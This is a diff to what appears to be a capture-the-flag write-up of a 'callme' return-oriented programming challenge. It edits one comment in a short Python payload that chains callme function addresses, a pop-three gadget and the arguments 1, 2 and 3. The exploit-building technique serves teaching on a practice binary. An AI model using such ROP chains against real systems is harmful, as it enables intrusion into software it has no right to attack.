@@ -824,7 +824,7 @@ Now, we just have to do the exploit step by step.
  18 payload += p32(0x2) # Argument 2 for callme_one()
  19 payload += p32(0x3) # Argument 3 for callme_one()
  20 
- 21 payload += callme_two_addr # The gadget then returns into callme_two() and the cycle continues..
+ 21 payload += callme_two_addr # The gadget pops the 1,2,3 then returns into callme_two() and the cycle continues..
  22 payload += pop_three_addr
  23 payload += p32(0x1)
  24 payload += p32(0x2)
